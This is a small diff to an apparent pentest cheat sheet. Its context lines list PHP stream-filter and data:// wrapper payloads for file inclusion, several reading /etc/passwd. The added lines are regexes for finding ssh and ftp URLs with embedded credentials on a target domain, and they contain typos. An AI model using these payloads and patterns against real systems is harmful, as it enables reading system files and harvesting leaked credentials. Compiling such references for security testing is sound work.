@@ -47,3 +47,8 @@ php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=</br>
 php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala</br>
 php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd</br>
 php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd</br>
+
+<h1>Git exposed credentias com regex</h1>
+/ssh:\/\/.*:.*@.*target\.com/</br>
+/ftp:\/\/.*:.*@.*taget\.com//</br>
+/ssh:\/\/.*:.*@.*\.com/ NOT "git"/</br>
